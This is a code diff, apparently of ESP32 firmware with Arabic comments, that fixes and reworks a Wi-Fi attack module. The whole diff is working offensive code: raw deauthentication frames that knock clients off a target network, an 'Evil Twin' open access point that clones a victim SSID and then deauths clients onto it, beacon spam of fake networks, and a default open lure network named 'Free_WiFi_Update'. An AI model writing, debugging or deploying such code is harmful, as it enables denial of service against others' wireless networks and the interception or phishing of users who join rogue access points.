@@ -7,7 +7,7 @@ static TaskHandle_t beacon_task_handle = NULL;
 static String spam_base_name;
 static int spam_count = 0;
 
-// دالة إرسال حزم Deauth (قطع الاتصال)
+// إرسال حزم Deauth لقطع الاتصال
 void startDeauth(uint8_t* bssid, uint8_t channel) {
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     uint8_t deauth_packet[26] = {
@@ -23,20 +23,22 @@ void startDeauth(uint8_t* bssid, uint8_t channel) {
     }
 }
 
-// دالة بدء Evil Twin
+// دالة Evil Twin (تم إصلاح الانهيار)
 void startEvilTwin(String ssid, uint8_t* bssid, uint8_t channel) {
-    stopAllAttacks(); // إغلاق أي هجوم سابق أولاً
-    
-    startDeauth(bssid, channel);
-    
-    WiFi.softAPdisconnect(true);
-    delay(200); // انتظار إغلاق الشبكة
-    
+    stopAllAttacks(); 
+    delay(200); 
+
+    // فتح الشبكة الوهمية أولاً
+    WiFi.mode(WIFI_AP);
     WiFi.softAP(ssid.c_str(), "", channel);
     Serial.println("Evil Twin started on: " + ssid);
+    
+    // ثم إرسال حزم القطع
+    delay(100);
+    startDeauth(bssid, channel);
 }
 
-// دالة المهمة الخلفية لبث الشبكات الوهمية (Beacon Spam)
+// مهمة بث الشبكات الوهمية
 void beaconTask(void * parameter) {
     uint8_t beacon_packet[128] = {
         0x80, 0x00, 0x00, 0x00,
@@ -58,7 +60,8 @@ void beaconTask(void * parameter) {
         beacon_packet[37] = ssid_len;
         memcpy(&beacon_packet[38], current_ssid.c_str(), ssid_len);
 
-        esp_wifi_80211_tx(WIFI_IF_AP, beacon_packet, 38 + ssid_len, false);
+        // إرسال الحزم عبر واجهة STA لأنها أكثر استقراراً
+        esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, 38 + ssid_len, false);
         
         counter++;
         if (counter > spam_count) counter = 1;
@@ -67,9 +70,14 @@ void beaconTask(void * parameter) {
     vTaskDelete(NULL);
 }
 
-// دالة تشغيل بث الشبكات
 void startBeaconSpam(String baseName, int count) {
     stopAllAttacks();
+    delay(200);
+    
+    // تفعيل وضع AP+STA للسماح بالبث عبر واجهة STA
+    WiFi.mode(WIFI_AP_STA); 
+    delay(100);
+
     spam_base_name = baseName;
     spam_count = count;
     beacon_spam_active = true;
@@ -77,27 +85,23 @@ void startBeaconSpam(String baseName, int count) {
     Serial.println("Beacon Spam started: " + baseName + " x" + String(count));
 }
 
-void initAttacks() {
-    // لا شيء هنا حالياً
-}
+void initAttacks() {}
 
-// دالة إيقاف جميع الهجمات وإعادة التشغيل الآمن
+// دالة إيقاف الهجمات وإعادة الوضع الطبيعي
 void stopAllAttacks() {
     if (beacon_spam_active) {
         beacon_spam_active = false;
         if (beacon_task_handle != NULL) {
-            vTaskDelay(100); // انتظار توقف المهمة
+            vTaskDelay(100);
             beacon_task_handle = NULL;
         }
     }
     
-    // إغلاق كامل للاتصالات لمنع الانهيار
-    WiFi.disconnect(true);
     WiFi.softAPdisconnect(true);
-    delay(200);
+    WiFi.disconnect(true);
+    delay(300);
     
-    // العودة للوضع الطبيعي (AP أساسي)
     WiFi.mode(WIFI_AP);
     WiFi.softAP("Free_WiFi_Update", "");
+    delay(100);
 }
-
